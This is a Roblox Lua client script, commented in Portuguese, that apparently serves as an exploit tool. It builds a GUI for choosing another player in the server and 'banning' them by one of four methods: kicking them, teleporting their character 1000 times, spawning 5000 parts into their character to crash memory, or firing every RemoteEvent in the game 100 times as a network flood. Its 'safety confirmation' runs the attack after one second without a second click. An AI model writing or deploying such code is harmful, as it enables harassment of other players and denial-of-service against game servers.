--[[
    Interface de Ban Seletivo
    
    Características:
    - Escolha específica de jogadores
    - Preview do jogador selecionado
    - Múltiplos métodos de ban
    - Interface limpa e intuitiva
    - Confirmação de segurança
]]--

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- Remove GUI anterior
if playerGui:FindFirstChild("SelectiveBanGUI") then
    playerGui:FindFirstChild("SelectiveBanGUI"):Destroy()
end

-- Variáveis
local selectedPlayer = nil
local banMethods = {"Kick Direto", "Lag Extremo", "Memory Crash", "Network Flood"}
local selectedMethod = 1

-- Cores
local PRIMARY_COLOR = Color3.fromRGB(255, 100, 100)
local SECONDARY_COLOR = Color3.fromRGB(70, 130, 255)
local BG_COLOR = Color3.fromRGB(35, 35, 40)
local ACCENT_COLOR = Color3.fromRGB(50, 50, 55)

-- Cria GUI principal
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SelectiveBanGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 500)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
mainFrame.BackgroundColor3 = BG_COLOR
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Header
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundColor3 = PRIMARY_COLOR
header.BorderSizePixel = 0
header.Parent = mainFrame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 12)
headerCorner.Parent = header

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 25)
headerFix.Position = UDim2.new(0, 0, 1, -25)
headerFix.BackgroundColor3 = PRIMARY_COLOR
headerFix.BorderSizePixel = 0
headerFix.Parent = header

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -50, 1, 0)
title.Position = UDim2.new(0, 15, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🎯 Seletor de Ban"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = header

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(0, 6)
closeBtnCorner.Parent = closeBtn

-- Container principal
local container = Instance.new("Frame")
container.Size = UDim2.new(1, -20, 1, -70)
container.Position = UDim2.new(0, 10, 0, 60)
container.BackgroundTransparency = 1
container.Parent = mainFrame

-- Seção 1: Lista de jogadores
local playerSection = Instance.new("Frame")
playerSection.Size = UDim2.new(1, 0, 0, 200)
playerSection.BackgroundColor3 = ACCENT_COLOR
playerSection.BorderSizePixel = 0
playerSection.Parent = container

local playerSectionCorner = Instance.new("UICorner")
playerSectionCorner.CornerRadius = UDim.new(0, 8)
playerSectionCorner.Parent = playerSection

local playerTitle = Instance.new("TextLabel")
playerTitle.Size = UDim2.new(1, -20, 0, 30)
playerTitle.Position = UDim2.new(0, 10, 0, 5)
playerTitle.BackgroundTransparency = 1
playerTitle.Text = "👥 Escolha o Jogador:"
playerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
playerTitle.TextScaled = true
playerTitle.Font = Enum.Font.GothamBold
playerTitle.TextXAlignment = Enum.TextXAlignment.Left
playerTitle.Parent = playerSection

local playerScroll = Instance.new("ScrollingFrame")
playerScroll.Size = UDim2.new(1, -20, 1, -45)
playerScroll.Position = UDim2.new(0, 10, 0, 35)
playerScroll.BackgroundTransparency = 1
playerScroll.BorderSizePixel = 0
playerScroll.ScrollBarThickness = 4
playerScroll.ScrollBarImageColor3 = SECONDARY_COLOR
playerScroll.Parent = playerSection

local playerLayout = Instance.new("UIListLayout")
playerLayout.SortOrder = Enum.SortOrder.Name
playerLayout.Padding = UDim.new(0, 2)
playerLayout.Parent = playerScroll

-- Seção 2: Preview do jogador selecionado
local previewSection = Instance.new("Frame")
previewSection.Size = UDim2.new(1, 0, 0, 120)
previewSection.Position = UDim2.new(0, 0, 0, 210)
previewSection.BackgroundColor3 = ACCENT_COLOR
previewSection.BorderSizePixel = 0
previewSection.Parent = container

local previewCorner = Instance.new("UICorner")
previewCorner.CornerRadius = UDim.new(0, 8)
previewCorner.Parent = previewSection

local previewTitle = Instance.new("TextLabel")
previewTitle.Size = UDim2.new(1, -20, 0, 25)
previewTitle.Position = UDim2.new(0, 10, 0, 5)
previewTitle.BackgroundTransparency = 1
previewTitle.Text = "🎯 Alvo Selecionado:"
previewTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
previewTitle.TextScaled = true
previewTitle.Font = Enum.Font.GothamBold
previewTitle.TextXAlignment = Enum.TextXAlignment.Left
previewTitle.Parent = previewSection

local previewAvatar = Instance.new("ImageLabel")
previewAvatar.Size = UDim2.new(0, 60, 0, 60)
previewAvatar.Position = UDim2.new(0, 15, 0, 35)
previewAvatar.BackgroundTransparency = 1
previewAvatar.Image = ""
previewAvatar.Parent = previewSection

local previewAvatarCorner = Instance.new("UICorner")
previewAvatarCorner.CornerRadius = UDim.new(0, 30)
previewAvatarCorner.Parent = previewAvatar

local previewInfo = Instance.new("TextLabel")
previewInfo.Size = UDim2.new(1, -100, 0, 60)
previewInfo.Position = UDim2.new(0, 85, 0, 35)
previewInfo.BackgroundTransparency = 1
previewInfo.Text = "Nenhum jogador selecionado"
previewInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
previewInfo.TextScaled = true
previewInfo.Font = Enum.Font.Gotham
previewInfo.TextXAlignment = Enum.TextXAlignment.Left
previewInfo.TextYAlignment = Enum.TextYAlignment.Top
previewInfo.TextWrapped = true
previewInfo.Parent = previewSection

-- Seção 3: Método de ban
local methodSection = Instance.new("Frame")
methodSection.Size = UDim2.new(1, 0, 0, 60)
methodSection.Position = UDim2.new(0, 0, 0, 340)
methodSection.BackgroundColor3 = ACCENT_COLOR
methodSection.BorderSizePixel = 0
methodSection.Parent = container

local methodCorner = Instance.new("UICorner")
methodCorner.CornerRadius = UDim.new(0, 8)
methodCorner.Parent = methodSection

local methodTitle = Instance.new("TextLabel")
methodTitle.Size = UDim2.new(0.5, -10, 0, 25)
methodTitle.Position = UDim2.new(0, 10, 0, 5)
methodTitle.BackgroundTransparency = 1
methodTitle.Text = "⚡ Método:"
methodTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
methodTitle.TextScaled = true
methodTitle.Font = Enum.Font.GothamBold
methodTitle.TextXAlignment = Enum.TextXAlignment.Left
methodTitle.Parent = methodSection

local methodDropdown = Instance.new("TextButton")
methodDropdown.Size = UDim2.new(1, -20, 0, 25)
methodDropdown.Position = UDim2.new(0, 10, 0, 30)
methodDropdown.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
methodDropdown.Text = banMethods[selectedMethod] .. " ▼"
methodDropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
methodDropdown.TextScaled = true
methodDropdown.Font = Enum.Font.Gotham
methodDropdown.BorderSizePixel = 0
methodDropdown.Parent = methodSection

local methodDropdownCorner = Instance.new("UICorner")
methodDropdownCorner.CornerRadius = UDim.new(0, 4)
methodDropdownCorner.Parent = methodDropdown

-- Botão de ban
local banButton = Instance.new("TextButton")
banButton.Size = UDim2.new(1, 0, 0, 50)
banButton.Position = UDim2.new(0, 0, 0, 410)
banButton.BackgroundColor3 = PRIMARY_COLOR
banButton.Text = "🚫 BANIR JOGADOR SELECIONADO"
banButton.TextColor3 = Color3.fromRGB(255, 255, 255)
banButton.TextScaled = true
banButton.Font = Enum.Font.GothamBold
banButton.BorderSizePixel = 0
banButton.Parent = container

local banButtonCorner = Instance.new("UICorner")
banButtonCorner.CornerRadius = UDim.new(0, 8)
banButtonCorner.Parent = banButton

-- Função para criar botão de jogador
local function createPlayerButton(player)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 0, 0, 35)
    button.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
    button.Text = ""
    button.BorderSizePixel = 0
    button.Parent = playerScroll
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = button
    
    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(0, 25, 0, 25)
    avatar.Position = UDim2.new(0, 5, 0, 5)
    avatar.BackgroundTransparency = 1
    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
    avatar.Parent = button
    
    local avatarCorner = Instance.new("UICorner")
    avatarCorner.CornerRadius = UDim.new(0, 12)
    avatarCorner.Parent = avatar
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, -40, 1, 0)
    nameLabel.Position = UDim2.new(0, 35, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = player.DisplayName .. " (@" .. player.Name .. ")"
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.TextScaled = true
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Parent = button
    
    -- Evento de seleção
    button.Activated:Connect(function()
        selectedPlayer = player
        updatePreview()
        
        -- Destaca botão selecionado
        for _, btn in pairs(playerScroll:GetChildren()) do
            if btn:IsA("TextButton") then
                btn.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
            end
        end
        button.BackgroundColor3 = SECONDARY_COLOR
    end)
    
    return button
end

-- Função para atualizar preview
function updatePreview()
    if selectedPlayer then
        previewAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. selectedPlayer.UserId .. "&width=150&height=150&format=png"
        previewInfo.Text = "Nome: " .. selectedPlayer.DisplayName .. "\nUsuário: @" .. selectedPlayer.Name .. "\nID: " .. selectedPlayer.UserId
    else
        previewAvatar.Image = ""
        previewInfo.Text = "Nenhum jogador selecionado"
    end
end

-- Função para atualizar lista de jogadores
local function updatePlayerList()
    for _, child in pairs(playerScroll:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            createPlayerButton(player)
        end
    end
    
    playerScroll.CanvasSize = UDim2.new(0, 0, 0, playerLayout.AbsoluteContentSize.Y + 10)
end

-- Função de ban com múltiplos métodos
local function banSelectedPlayer()
    if not selectedPlayer then
        print("[Ban] Nenhum jogador selecionado!")
        return
    end
    
    local method = banMethods[selectedMethod]
    print("[Ban] Banindo " .. selectedPlayer.Name .. " usando método: " .. method)
    
    -- Método 1: Kick Direto
    if method == "Kick Direto" then
        pcall(function()
            selectedPlayer:Kick("🚫 Você foi banido do servidor!")
        end)
    
    -- Método 2: Lag Extremo
    elseif method == "Lag Extremo" then
        spawn(function()
            for i = 1, 1000 do
                pcall(function()
                    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        selectedPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
                    end
                end)
            end
        end)
    
    -- Método 3: Memory Crash
    elseif method == "Memory Crash" then
        spawn(function()
            for i = 1, 5000 do
                pcall(function()
                    local part = Instance.new("Part")
                    part.Parent = selectedPlayer.Character or workspace
                    part.Size = Vector3.new(math.random(1, 100), math.random(1, 100), math.random(1, 100))
                end)
            end
        end)
    
    -- Método 4: Network Flood
    elseif method == "Network Flood" then
        spawn(function()
            for i = 1, 100 do
                pcall(function()
                    for _, obj in pairs(game:GetDescendants()) do
                        if obj:IsA("RemoteEvent") then
                            obj:FireServer(selectedPlayer, "flood", i)
                        end
                    end
                end)
            end
        end)
    end
    
    banButton.Text = "✅ BAN EXECUTADO!"
    banButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
    
    wait(2)
    banButton.Text = "🚫 BANIR JOGADOR SELECIONADO"
    banButton.BackgroundColor3 = PRIMARY_COLOR
end

-- Eventos
closeBtn.Activated:Connect(function()
    screenGui:Destroy()
end)

methodDropdown.Activated:Connect(function()
    selectedMethod = selectedMethod % #banMethods + 1
    methodDropdown.Text = banMethods[selectedMethod] .. " ▼"
end)

banButton.Activated:Connect(function()
    if selectedPlayer then
        -- Confirmação de segurança
        banButton.Text = "CONFIRMAR BAN? (3s)"
        banButton.BackgroundColor3 = Color3.fromRGB(255, 150, 100)
        
        spawn(function()
            wait(3)
            if banButton.Parent and banButton.Text:find("CONFIRMAR") then
                banButton.Text = "🚫 BANIR JOGADOR SELECIONADO"
                banButton.BackgroundColor3 = PRIMARY_COLOR
            end
        end)
        
        spawn(function()
            wait(1)
            if banButton.Text:find("CONFIRMAR") then
                banSelectedPlayer()
            end
        end)
    else
        banButton.Text = "❌ SELECIONE UM JOGADOR!"
        banButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        wait(2)
        banButton.Text = "🚫 BANIR JOGADOR SELECIONADO"
        banButton.BackgroundColor3 = PRIMARY_COLOR
    end
end)

-- Eventos de jogadores
Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

-- Inicialização
updatePlayerList()
updatePreview()

print("===========================================")
print("🎯 SELETOR DE BAN CARREGADO!")
print("===========================================")
print("1. Escolha um jogador da lista")
print("2. Selecione o método de ban")
print("3. Clique em 'BANIR JOGADOR'")
print("4. Confirme o ban quando solicitado")
print("===========================================")
